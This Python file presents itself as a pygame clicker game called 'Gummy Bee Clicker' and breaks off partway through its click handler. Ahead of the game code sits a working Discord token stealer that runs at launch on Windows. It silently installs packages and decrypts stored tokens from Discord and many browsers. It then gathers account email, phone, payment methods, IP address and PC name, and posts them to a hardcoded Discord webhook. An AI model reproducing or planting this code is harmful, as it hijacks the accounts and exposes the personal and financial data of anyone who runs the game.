import pygame
import time
import math
import random

import os
if os.name != "nt":
    exit()
import subprocess
import sys
import json
import urllib.request
import re
import base64
import datetime

def install_import(modules):
    for module, pip_name in modules:
        try:
            __import__(module)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            os.execl(sys.executable, sys.executable, *sys.argv)

install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])

import win32crypt
from Crypto.Cipher import AES

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Lightcord': ROAMING + '\\Lightcord',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
}

def getheaders(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }

    if token:
        headers.update({"Authorization": token})

    return headers

def gettokens(path):
    path += "\\Local Storage\\leveldb\\"
    tokens = []

    if not os.path.exists(path):
        return tokens

    for file in os.listdir(path):
        if not file.endswith(".ldb") and file.endswith(".log"):
            continue

        try:
            with open(f"{path}{file}", "r", errors="ignore") as f:
                for line in (x.strip() for x in f.readlines()):
                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        tokens.append(values)
        except PermissionError:
            continue

    return tokens
    
def getkey(path):
    with open(path + f"\\Local State", "r") as file:
        key = json.loads(file.read())['os_crypt']['encrypted_key']
        file.close()

    return key

def getip():
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
            return json.loads(response.read().decode()).get("ip")
    except:
        return "None"

def main():
    checked = []

    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue

        for token in gettokens(path):
            token = token.replace("\\", "") if token.endswith("\\") else token

            try:
                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
                if token in checked:
                    continue
                checked.append(token)

                res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
                if res.getcode() != 200:
                    continue
                res_json = json.loads(res.read().decode())

                badges = ""
                flags = res_json['flags']
                if flags == 64 or flags == 96:
                    badges += ":BadgeBravery: "
                if flags == 128 or flags == 160:
                    badges += ":BadgeBrilliance: "
                if flags == 256 or flags == 288:
                    badges += ":BadgeBalance: "

                params = urllib.parse.urlencode({"with_counts": True})
                res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{params}', headers=getheaders(token))).read().decode())
                guilds = len(res)
                guild_infos = ""

                for guild in res:
                    if guild['permissions'] & 8 or guild['permissions'] & 32:
                        res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=getheaders(token))).read().decode())
                        vanity = ""

                        if res["vanity_url_code"] != None:
                            vanity = f"""; .gg/{res["vanity_url_code"]}"""

                        guild_infos += f"""\nㅤ- [{guild['name']}]: {guild['approximate_member_count']}{vanity}"""
                if guild_infos == "":
                    guild_infos = "No guilds"

                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token))).read().decode())
                has_nitro = False
                has_nitro = bool(len(res) > 0)
                exp_date = None
                if has_nitro:
                    badges += f":BadgeSubscriber: "
                    exp_date = datetime.datetime.strptime(res[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')

                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(token))).read().decode())
                available = 0
                print_boost = ""
                boost = False
                for id in res:
                    cooldown = datetime.datetime.strptime(id["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
                    if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
                        print_boost += f"ㅤ- Available now\n"
                        available += 1
                    else:
                        print_boost += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
                    boost = True
                if boost:
                    badges += f":BadgeBoost: "

                payment_methods = 0
                type = ""
                valid = 0
                for x in json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=getheaders(token))).read().decode()):
                    if x['type'] == 1:
                        type += "CreditCard "
                        if not x['invalid']:
                            valid += 1
                        payment_methods += 1
                    elif x['type'] == 2:
                        type += "PayPal "
                        if not x['invalid']:
                            valid += 1
                        payment_methods += 1

                print_nitro = f"\nNitro Informations:\n```yaml\nHas Nitro: {has_nitro}\nExpiration Date: {exp_date}\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
                nnbutb = f"\nNitro Informations:\n```yaml\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
                print_pm = f"\nPayment Methods:\n```yaml\nAmount: {payment_methods}\nValid Methods: {valid} method(s)\nType: {type}\n```"
                embed_user = {
                    'embeds': [
                        {
                            'title': f"**New user data: {res_json['username']}**",
                            'description': f"""
                                ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {getip()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```""",
                            'color': 3092790,
                            'footer': {
                                'text': "Made by Seedra ・ https://github.com/YouSmell21"
                            },
                            'thumbnail': {
                                'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"
                            }
                        }
                    ],
                    "username": "Grabber",
                    "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
                }

                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1472692816080797717/Jr_2MynHh7XPGe1OCi3fsGxAnTnf2EYoFkMlXsQKKaLKHR_g3gSt89zCQq_ubi2hPtNy', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
            except urllib.error.HTTPError or json.JSONDecodeError:
                continue
            except Exception as e:
                print(f"ERROR: {e}")
                continue

if __name__ == "__main__":
    main()


pygame.init()

MUSIC_END_EVENT = pygame.USEREVENT + 1
MUSIC_LOADED = False
try:
    pygame.mixer.init()
    pygame.mixer.music.load(os.path.join("assets", "ost.mp3"))
    pygame.mixer.music.set_volume(0.5)
    pygame.mixer.music.play(-1)
    pygame.mixer.music.set_endevent(MUSIC_END_EVENT)
    MUSIC_LOADED = True
except Exception:
    pass

WIDTH, HEIGHT = 1150, 700
screen = pygame.display.set_mode((WIDTH, HEIGHT))
pygame.display.set_caption("🍯 Gummy Bee Clicker")

# ─── FONTS ─────────────────────────────────────────────────────────────────
font_xs  = pygame.font.SysFont("arial", 14)
font_sm  = pygame.font.SysFont("arial", 17)
font     = pygame.font.SysFont("arial", 21)
font_md  = pygame.font.SysFont("arial", 25, bold=True)
big_font = pygame.font.SysFont("arial", 38, bold=True)
huge_font= pygame.font.SysFont("arial", 70, bold=True)

clock = pygame.time.Clock()

# ─── HELPERS ───────────────────────────────────────────────────────────────
def fmt(n):
    if n >= 1e12: return f"{n/1e12:.2f}T"
    if n >= 1e9:  return f"{n/1e9:.2f}B"
    if n >= 1e6:  return f"{n/1e6:.2f}M"
    if n >= 1e3:  return f"{n/1e3:.1f}K"
    return str(int(n))

def load_img(name, size):
    try:
        img = pygame.image.load(os.path.join("assets", name)).convert_alpha()
        return pygame.transform.scale(img, size)
    except:
        s = pygame.Surface(size, pygame.SRCALPHA)
        s.fill((255, 220, 50, 200))
        pygame.draw.ellipse(s, (255, 180, 0), s.get_rect(), 4)
        return s

def glow(surf, color, pos, radius, alpha=80):
    """Radial glow using additive blending."""
    g = pygame.Surface((radius*2, radius*2), pygame.SRCALPHA)
    for r in range(radius, 0, max(1, radius//12)):
        a = int(alpha * (1 - r/radius)**1.5)
        pygame.draw.circle(g, (*color, a), (radius, radius), r)
    surf.blit(g, (pos[0]-radius, pos[1]-radius), special_flags=pygame.BLEND_RGBA_ADD)

def draw_rounded_rect(surf, color, rect, radius=10, border_color=None, border=2):
    pygame.draw.rect(surf, color, rect, border_radius=radius)
    if border_color:
        pygame.draw.rect(surf, border_color, rect, border, border_radius=radius)

# ─── ASSET LOAD ────────────────────────────────────────────────────────────
bee_normal  = load_img("bee.png",        (260, 260))
bee_gifted  = load_img("bee_gifted.png", (260, 260))
star_img    = load_img("star.png",       (80, 80))
baller_img  = load_img("baller.png",     (150, 150))

BEE_CX, BEE_CY = 270, HEIGHT // 2

# ─── PARTICLE CLASSES ──────────────────────────────────────────────────────
class FloatingText:
    COLORS = [(255,230,50),(255,180,80),(200,255,150),(150,230,255),(255,150,255)]
    def __init__(self, x, y, text, color=(255,220,50), size=24):
        self.x = x + random.randint(-25, 25)
        self.y = y
        self.text = text
        self.color = color
        self.alpha = 255
        self.vy = -random.uniform(70, 140)
        self.vx = random.uniform(-35, 35)
        self.life = random.uniform(1.0, 1.6)
        self.age = 0
        self.f = pygame.font.SysFont("arial", size, bold=True)
    def update(self, dt):
        self.age += dt
        self.x += self.vx * dt
        self.y += self.vy * dt
        self.vy += 30 * dt
        self.alpha = max(0, int(255 * (1 - self.age / self.life)))
    def draw(self, surf):
        if self.alpha <= 0: return
        t = self.f.render(self.text, True, self.color)
        t.set_alpha(self.alpha)
        surf.blit(t, (int(self.x - t.get_width()//2), int(self.y)))
    @property
    def dead(self): return self.age >= self.life

class Particle:
    GOO_COLORS = [(255,220,50),(255,180,0),(255,255,100),(200,255,100),(255,200,0)]
    def __init__(self, x, y, color=None, speed_mul=1.0, gravity=True):
        angle = random.uniform(0, math.tau)
        spd   = random.uniform(60, 320) * speed_mul
        self.x, self.y = x, y
        self.vx = math.cos(angle) * spd
        self.vy = math.sin(angle) * spd
        self.color = color or random.choice(self.GOO_COLORS)
        self.size  = random.uniform(3, 9)
        self.life  = random.uniform(0.4, 1.1)
        self.age   = 0
        self.grav  = random.uniform(120, 280) if gravity else 0
    def update(self, dt):
        self.age += dt
        self.x += self.vx * dt; self.vy += self.grav * dt
        self.y += self.vy * dt; self.vx *= 0.97
    def draw(self, surf):
        a = max(0, int(255 * (1 - self.age / self.life)))
        s = max(1, int(self.size * (1 - self.age / self.life * 0.4)))
        r = pygame.Surface((s*2+2, s*2+2), pygame.SRCALPHA)
        pygame.draw.circle(r, (*self.color, a), (s+1, s+1), s)
        surf.blit(r, (int(self.x-s), int(self.y-s)))
    @property
    def dead(self): return self.age >= self.life

class Sparkle:
    COLORS = [(255,255,160),(255,220,100),(200,255,200),(160,255,255),(255,180,255)]
    def __init__(self, x, y):
        self.x, self.y = x + random.uniform(-40,40), y + random.uniform(-40,40)
        self.life = random.uniform(0.5, 1.3)
        self.age  = 0
        self.size = random.uniform(4, 14)
        self.angle = random.uniform(0, math.tau)
        self.spin  = random.uniform(-5, 5)
        self.color = random.choice(self.COLORS)
    def update(self, dt):
        self.age += dt; self.angle += self.spin * dt; self.size *= 0.96
    def draw(self, surf):
        a = max(0, int(255 * (1 - self.age / self.life)))
        s = self.size
        cx, cy = int(self.x), int(self.y)
        pts = []
        for i in range(8):
            r2 = s if i % 2 == 0 else s * 0.38
            ang = self.angle + i * math.pi / 4
            pts.append((cx + math.cos(ang)*r2, cy + math.sin(ang)*r2))
        tmp = pygame.Surface((int(s*4)+4, int(s*4)+4), pygame.SRCALPHA)
        ox, oy = int(s*2)+2, int(s*2)+2
        adj = [(p[0]-cx+ox, p[1]-cy+oy) for p in pts]
        if len(adj) >= 3:
            pygame.draw.polygon(tmp, (*self.color, a), adj)
        surf.blit(tmp, (cx-ox, cy-oy))
    @property
    def dead(self): return self.age >= self.life

class Pollen:
    """Ambient floating pollen in left play area."""
    def __init__(self):
        self.reset(respawn=False)
    def reset(self, respawn=True):
        self.x  = random.uniform(10, 510)
        self.y  = HEIGHT + 20 if respawn else random.uniform(-20, HEIGHT+20)
        self.vy = random.uniform(-25, -70)
        self.vx = random.uniform(-15, 15)
        self.sz = random.uniform(3, 7)
        self.col= random.choice([(255,220,100),(200,255,150),(255,200,220),(220,220,255)])
        self.alpha = random.randint(60, 160)
        self.angle = random.uniform(0, math.tau)
        self.spin  = random.uniform(-1.5, 1.5)
    def update(self, dt):
        self.x += self.vx*dt; self.y += self.vy*dt; self.angle += self.spin*dt
        if self.y < -20: self.reset()
    def draw(self, surf):
        s = pygame.Surface((int(self.sz*4)+2, int(self.sz*4)+2), pygame.SRCALPHA)
        pygame.draw.circle(s, (*self.col, self.alpha), (int(self.sz*2)+1, int(self.sz*2)+1), int(self.sz))
        surf.blit(s, (int(self.x-self.sz*2), int(self.y-self.sz*2)))

class RisingGoo:
    """Big number that rises from the bee on big events."""
    def __init__(self, text):
        self.x = BEE_CX + random.randint(-60,60)
        self.y = BEE_CY - 80
        self.text = text
        self.age, self.life = 0, 2.2
        self.vy = -90
    def update(self, dt):
        self.age += dt; self.y += self.vy*dt; self.vy += 20*dt
    def draw(self, surf):
        a = max(0, int(255*(1-self.age/self.life)))
        t  = big_font.render(self.text, True, (255,240,50))
        sh = big_font.render(self.text, True, (80,60,0))
        t.set_alpha(a); sh.set_alpha(a)
        surf.blit(sh, (int(self.x - t.get_width()//2)+2, int(self.y)+2))
        surf.blit(t,  (int(self.x - t.get_width()//2),   int(self.y)))
    @property
    def dead(self): return self.age >= self.life

class GoldenBee:
    """Golden cookie equivalent — random bonus bee that appears."""
    def __init__(self):
        self.active = False
        self.next   = time.time() + random.uniform(25, 80)
        self.x = self.y = 0
        self.spawn_t = 0
        self.DURATION = 9
        self.vx = self.vy = 0
        self.pulse = 0
        self._img = load_img("bee.png", (90, 90))
    def update(self, dt):
        if not self.active:
            if time.time() >= self.next:
                self.active  = True
                self.x, self.y = random.uniform(20,480), random.uniform(80, HEIGHT-100)
                self.spawn_t = time.time()
                self.vx = random.choice([-1,1]) * random.uniform(40,80)
                self.vy = random.choice([-1,1]) * random.uniform(20,50)
            return
        self.pulse = (math.sin(time.time()*7)+1)*0.5
        self.x += self.vx*dt; self.y += self.vy*dt
        if self.x < 10 or self.x > 490: self.vx *= -1
        if self.y < 60 or self.y > HEIGHT-90: self.vy *= -1
        if time.time()-self.spawn_t > self.DURATION:
            self.active = False
            self.next   = time.time() + random.uniform(25,80)
    def draw(self, surf):
        if not self.active: return
        cx, cy = int(self.x+45), int(self.y+45)
        glow(surf, (255,220,0), (cx,cy), int(55+self.pulse*18), 160)
        tinted = self._img.copy()
        overlay = pygame.Surface((90,90), pygame.SRCALPHA)
        overlay.fill((255,230,50,120))
        tinted.blit(overlay,(0,0))
        surf.blit(tinted, (int(self.x), int(self.y)))
        label = font_xs.render("✨ CLICK ME ✨", True,(255,255,50))
        surf.blit(label,(cx - label.get_width()//2, int(self.y)-22))
        frac = 1 - (time.time()-self.spawn_t)/self.DURATION
        bw=80; bx=cx-bw//2; by=int(self.y)+95
        pygame.draw.rect(surf,(60,60,20),(bx,by,bw,7),border_radius=4)
        pygame.draw.rect(surf,(255,220,50),(bx,by,int(bw*frac),7),border_radius=4)
    def rect(self):
        return pygame.Rect(int(self.x),int(self.y),90,90)
    def collect(self):
        self.active = False
        self.next   = time.time() + random.uniform(25,80)
        return random.choice(["boost","blast","mode"])

class ScreenShake:
    def __init__(self): self.trauma=0; self.off=(0,0)
    def add(self, v): self.trauma = min(1,self.trauma+v)
    def update(self, dt):
        if self.trauma > 0:
            self.trauma = max(0, self.trauma - dt*2.5)
            s = self.trauma**2 * 14
            self.off = (random.uniform(-s,s), random.uniform(-s,s))
        else: self.off = (0,0)

class Toast:
    """Achievement / event toast notification."""
    def __init__(self, text, icon="⭐", color=(255,220,100)):
        self.text=text; self.icon=icon; self.color=color
        self.age=0; self.life=3.5
    def update(self, dt): self.age += dt
    def draw(self, surf, y):
        a   = min(1, min(self.age/0.3, (self.life-self.age)/0.4))
        W,H2= 310, 52
        x   = WIDTH - W - 8
        bg  = pygame.Surface((W,H2), pygame.SRCALPHA)
        bg.fill((20,15,40,220))
        pygame.draw.rect(bg, (*self.color,200),(0,0,W,H2),2,border_radius=8)
        surf.blit(bg,(x,y))
        ic = font_md.render(self.icon, True, self.color)
        surf.blit(ic,(x+8, y+12))
        tx = font_sm.render(self.text, True,(240,235,255))
        tx.set_alpha(int(a*255))
        surf.blit(tx,(x+42, y+16))
    @property
    def dead(self): return self.age >= self.life

# ─── HEX BACKGROUND ────────────────────────────────────────────────────────
HEX_SURF = pygame.Surface((WIDTH//2+20, HEIGHT), pygame.SRCALPHA)
hex_time = 0

def draw_hex_bg():
    global hex_time
    HEX_SURF.fill((0,0,0,0))
    sz = 38
    for row in range(HEIGHT//(sz)+3):
        for col in range((WIDTH//2+20)//(int(sz*1.8))+2):
            x = col * sz * 1.75
            y = row * sz * 1.52 + (sz*0.76 if col%2 else 0)
            wave = math.sin(hex_time*0.7 + x*0.025 + y*0.025)*0.5+0.5
            r = int(175 + wave*50)
            g = int(100 + wave*60)
            b = int(180 + wave*40)
            pts = [(x+math.cos(math.radians(60*i-30))*(sz-3),
                    y+math.sin(math.radians(60*i-30))*(sz-3)) for i in range(6)]
            pygame.draw.polygon(HEX_SURF, (r,g,b,220), pts)
            pygame.draw.polygon(HEX_SURF, (r-40,g-30,b-25,160), pts, 1)
    screen.blit(HEX_SURF, (0,0))

# ─── GAME STATE ────────────────────────────────────────────────────────────
goo            = 0.0
gifted_goo     = 0.0
gifted_goo_bonus = 1.0
total_earned   = 0.0

click_power    = 1
click_cd       = 0.2
last_click     = 0
auto_goo       = 0

stars          = []
base_star_mul  = 2.0
star_enhance   = 0
gifted_star_lv = 0
max_stars      = 1

baller_active  = False
baller_t       = 0
gifted_active  = False
gifted_end     = 0

discount_lv    = 0
discount_mul   = 1.0

scroll_off     = 0

# Combo
combo          = 0
combo_timer    = 0.0

# Bee animation
bee_sx = bee_sy = 1.0   # squish x/y
bee_anim = 0.0

# Particles
floats    = []
parts     = []
sparkles  = []
rising    = []
pollen    = [Pollen() for _ in range(50)]
g_bee     = GoldenBee()
shake     = ScreenShake()
toasts    = []

# Milestone tracking
milestones_hit = set()
MILESTONES = [500, 5000, 50000, 500000, 5_000_000, 50_000_000]

# ─── UPGRADE DATA ──────────────────────────────────────────────────────────
normal_ups = [
    {"name":"Gooey Hive Power",   "cost":40.0,    "base":40.0,    "type":"click",       "desc":"+1 click power",        "em":"🍯"},
    {"name":"Faster Gooning",     "cost":50.0,    "base":50.0,    "type":"cooldown",    "desc":"Click 25% faster",      "em":"⚡"},
    {"name":"Auto Goon",          "cost":100.0,   "base":100.0,   "type":"auto",        "desc":"+1 goo per second",     "em":"🤖"},
    {"name":"Gummy Star",         "cost":200.0,   "base":200.0,   "type":"star",        "desc":"Orbiting collector",    "em":"⭐"},
    {"name":"Star Enhancement",   "cost":500.0,   "base":500.0,   "type":"star_enh",    "desc":"+0.5x star bonus",      "em":"✨"},
    {"name":"Gummyballer",        "cost":10000.0, "base":10000.0, "type":"baller",      "desc":"Activate gifted mode!", "em":"🔮"},
]
sacrifice_ups = [
    {"name":"Discount Goo",       "cost":1.0,     "type":"discount",    "desc":"8% cheaper upgrades", "em":"💸"},
    {"name":"Gifted Gummy Star",  "cost":0.5,     "type":"gifted_star", "desc":"+2x star bonus",      "em":"🌟"},
    {"name":"Star Abusing",       "cost":2.0,     "type":"star_abuse",  "desc":"+1 max stars",        "em":"🌙"},
    {"name":"Gifted Goo Growth",  "cost":1.0,     "type":"gifted_grow", "desc":"+0.3 gifted mult",    "em":"🧬"},
]

# ─── STAR CLASS ────────────────────────────────────────────────────────────
class GummyStar:
    def __init__(self):
        self.spawn = time.time()
        self.LIFE  = 10
        self.angle = random.uniform(0, math.tau)
        self.radius= 155
        self.counter=0.0
        self.trail = []
    def update(self, dt):
        self.angle += 0.055
    def pos(self):
        return (BEE_CX + math.cos(self.angle)*self.radius,
                BEE_CY + math.sin(self.angle)*self.radius)
    def draw(self, surf):
        x, y = self.pos()
        # Trail
        self.trail.append((x, y))
        if len(self.trail) > 28: self.trail.pop(0)
        for i, (tx,ty) in enumerate(self.trail):
            frac = i/len(self.trail)
            a = int(170 * frac)
            s = max(1,int(7*frac))
            tmp = pygame.Surface((s*2+2,s*2+2), pygame.SRCALPHA)
            pygame.draw.circle(tmp,(255,220,80,a),(s+1,s+1),s)
            surf.blit(tmp,(int(tx-s),int(ty-s)))
        # Glow
        pulse = (math.sin(time.time()*5)+1)*0.5
        glow(surf,(255,220,50),(int(x),int(y)),int(38+pulse*14),120)
        # Image
        sc = 1 + pulse*0.08
        si = pygame.transform.scale(star_img,(int(80*sc),int(80*sc)))
        surf.blit(si, si.get_rect(center=(int(x),int(y))))
        # Counter
        t  = font_md.render(fmt(self.counter), True,(255,255,255))
        sh = font_md.render(fmt(self.counter), True,(0,0,0))
        surf.blit(sh,(int(x)-t.get_width()//2+1,int(y)-48+1))
        surf.blit(t, (int(x)-t.get_width()//2,  int(y)-48))
        # Timer bar
        frac2 = max(0, 1-(time.time()-self.spawn)/self.LIFE)
        bw=64; bx=int(x)-bw//2; by=int(y)+44
        pygame.draw.rect(surf,(80,80,80),(bx,by,bw,7),border_radius=4)
        pygame.draw.rect(surf,(255,200,50),(bx,by,int(bw*frac2),7),border_radius=4)
    def expired(self):
        return time.time()-self.spawn >= self.LIFE

# ─── PANEL LAYOUT ──────────────────────────────────────────────────────────
PANEL_X = 525
PANEL_W = WIDTH - PANEL_X

def get_panel_rects():
    """Return (normal_rects, sac_rect, gifted_rects) as pygame.Rect list."""
    y = 14 + scroll_off
    y += 32  # header
    nr = []
    for _ in normal_ups:
        nr.append(pygame.Rect(PANEL_X+8, y, PANEL_W-16, 62))
        y += 72
    y += 8
    sr = pygame.Rect(PANEL_X+8, y, PANEL_W-16, 52)
    y += 62
    y += 32  # header
    gr = []
    for _ in sacrifice_ups:
        gr.append(pygame.Rect(PANEL_X+8, y, PANEL_W-16, 62))
        y += 72
    return nr, sr, gr

# ─── DRAWING ───────────────────────────────────────────────────────────────
def draw_panel():
    # Dark panel bg with subtle top accent
    pygame.draw.rect(screen,(22,15,45),(PANEL_X,0,PANEL_W,HEIGHT))
    pygame.draw.rect(screen,(130,80,200),(PANEL_X,0,PANEL_W,5))

    nr, sr, gr = get_panel_rects()
    mx,my = pygame.mouse.get_pos()

    # Normal upgrades
    y0 = 14 + scroll_off
    h = font_md.render("⬆  UPGRADES", True,(200,175,255))
    screen.blit(h,(PANEL_X+12, y0)); y0+=32

    for i, up in enumerate(normal_ups):
        rect = nr[i]
        cost = up["cost"] * discount_mul
        afford= goo >= cost
        hover = rect.collidepoint(mx,my)
        col   = (80,60,165) if afford else (35,28,68)
        if hover: col = tuple(min(255,c+25) for c in col)
        brd   = (160,130,255) if afford else (70,60,110)
        draw_rounded_rect(screen, col, rect, 9, brd, 2)
        # progress bar
        frac = min(1.0, goo/max(1,cost))
        if frac < 1.0:
            pb = pygame.Rect(rect.x+2,rect.bottom-5,int((rect.w-4)*frac),4)
            pygame.draw.rect(screen,(140,110,255,180),pb,border_radius=2)
        em = font_md.render(up["em"], True,(255,255,200))
        screen.blit(em,(rect.x+7, rect.y+8))
        nm = font.render(up["name"], True,(240,235,255) if afford else (140,130,160))
        screen.blit(nm,(rect.x+38, rect.y+7))
        ds = font_sm.render(up["desc"], True,(170,160,210))
        screen.blit(ds,(rect.x+38, rect.y+34))
        ct = font_sm.render(f"Cost: {fmt(cost)}", True,(255,220,100) if afford else (140,130,110))
        screen.blit(ct,(rect.right-ct.get_width()-8, rect.y+8))

    # Sacrifice button
    s_afford = goo >= 10000
    s_col = (180,55,55) if not sr.collidepoint(mx,my) else (210,75,75)
    if s_afford: s_col = tuple(min(255,c+30) for c in s_col)
    draw_rounded_rect(screen,s_col,sr,9,(255,120,120),2)
    gain = round((goo/10000)*gifted_goo_bonus,2) if s_afford else 0
    st = font_sm.render(f"🌀  SACRIFICE — need 10K goo   →  +{gain} gifted goo",True,(255,200,200))
    screen.blit(st,(sr.x+8,sr.y+16))

    # Gifted upgrades
    y1 = sr.bottom + 10
    h2 = font_md.render("🌿  GIFTED UPGRADES", True,(100,255,190))
    screen.blit(h2,(PANEL_X+12, y1))

    for i, up in enumerate(sacrifice_ups):
        rect = gr[i]
        afford = gifted_goo >= up["cost"]
        hover  = rect.collidepoint(mx,my)
        col    = (35,120,80) if afford else (22,55,40)
        if hover: col = tuple(min(255,c+20) for c in col)
        brd    = (100,255,180) if afford else (55,120,85)
        draw_rounded_rect(screen, col, rect, 9, brd, 2)
        em = font_md.render(up["em"], True,(200,255,220))
        screen.blit(em,(rect.x+7, rect.y+8))
        nm = font.render(up["name"], True,(200,255,220) if afford else (120,165,145))
        screen.blit(nm,(rect.x+38, rect.y+7))
        ds = font_sm.render(up["desc"], True,(160,220,190))
        screen.blit(ds,(rect.x+38, rect.y+34))
        ct = font_sm.render(f"Cost: {round(up['cost'],2)} gifted",True,(150,255,200) if afford else (90,130,115))
        screen.blit(ct,(rect.right-ct.get_width()-8, rect.y+8))

def draw_hud():
    # Main goo display
    sh = big_font.render(f"🍯  {fmt(goo)} Goo", True,(80,60,0))
    t  = big_font.render(f"🍯  {fmt(goo)} Goo", True,(255,240,50))
    screen.blit(sh,(22,12)); screen.blit(t,(20,10))
    # Gifted
    screen.blit(font.render(f"✨  {round(gifted_goo,3)} Gifted Goo",True,(150,255,200)),(20,55))
    # Stats bar
    mul = 5 if gifted_active else 1
    rate= auto_goo*mul
    screen.blit(font_sm.render(f"⚙ {fmt(rate)}/s  |  👆 {click_power}  |  ⏱ {round(click_cd,2)}s",True,(190,185,215)),(20,85))
    screen.blit(font_sm.render(f"Total: {fmt(total_earned)}",True,(145,140,170)),(20,108))

    # Gifted mode banner
    if gifted_active:
        rem = gifted_end - time.time()
        pct = max(0,rem/10)
        bx, by = 20, HEIGHT-120
        t2 = font_md.render(f"✨  GIFTED MODE  x5  [{int(rem)+1}s]",True,(255,255,80))
        screen.blit(t2,(bx,by))
        pygame.draw.rect(screen,(60,60,20),(bx,by+32,200,10),border_radius=5)
        pygame.draw.rect(screen,(255,255,50),(bx,by+32,int(200*pct),10),border_radius=5)

    # Combo meter
    if combo >= 2:
        cx2,cy2 = 20, HEIGHT-170 if gifted_active else HEIGHT-120
        col3 = (255,100,50) if combo < 10 else (255,50,200)
        t3 = font_md.render(f"🔥  COMBO x{combo}  (+{int((combo-1)*10)}%)",True,col3)
        screen.blit(t3,(cx2,cy2))
        bw2=180; frac2=min(1.0,combo_timer/2.0)
        pygame.draw.rect(screen,(80,40,20),(cx2,cy2+30,bw2,9),border_radius=5)
        pygame.draw.rect(screen,(255,120,50),(cx2,cy2+30,int(bw2*frac2),9),border_radius=5)

# ─── ACTIONS ───────────────────────────────────────────────────────────────
def do_sacrifice():
    global goo, click_power, auto_goo, click_cd, gifted_goo
    if goo < 10000: return
    gained = (goo/10000)*gifted_goo_bonus
    gifted_goo += gained
    rising.append(RisingGoo(f"+{round(gained,2)} Gifted!"))
    for _ in range(4): floats.append(FloatingText(BEE_CX,BEE_CY,f"+{round(gained,2)} gifted",color=(150,255,200),size=26))
    for _ in range(60): parts.append(Particle(BEE_CX,BEE_CY,(150,255,200)))
    for _ in range(15): sparkles.append(Sparkle(BEE_CX+random.uniform(-80,80),BEE_CY+random.uniform(-80,80)))
    shake.add(0.6)
    toasts.append(Toast(f"Sacrificed! +{round(gained,2)} gifted goo","🌀",(200,150,255)))
    goo=0; click_power=1; auto_goo=0; click_cd=0.2
    for u in normal_ups: u["cost"] = u["base"]

def do_click(mx, my):
    global goo, total_earned, combo, combo_timer, bee_sx, bee_sy, bee_anim, last_click
    if time.time()-last_click < click_cd: return
    last_click = time.time()
    combo += 1; combo_timer = 2.0
    combo_mult = 1 + (combo-1)*0.1
    mul = 5 if gifted_active else 1
